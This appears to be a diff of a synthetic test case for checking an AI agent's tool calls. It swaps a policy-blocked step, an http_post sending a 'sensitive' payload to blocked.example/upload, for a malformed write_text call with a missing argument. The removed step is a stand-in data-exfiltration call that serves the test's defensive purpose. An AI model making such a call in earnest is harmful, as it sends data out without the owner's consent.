@@ -1,15 +1,13 @@
 {
-  "category": "policy_blocked",
+  "attack_family": "missing_required_write_text_arg",
+  "category": "malformed_payload",
   "name": "synthetic_0051",
   "steps": [
     {
       "args": {
-        "json_body": {
-          "payload": "sensitive"
-        },
-        "url": "https://blocked.example/upload"
+        "path": "workspace/synthetic_0051.txt"
       },
-      "tool_name": "http_post"
+      "tool_name": "write_text"
     }
   ]
 }
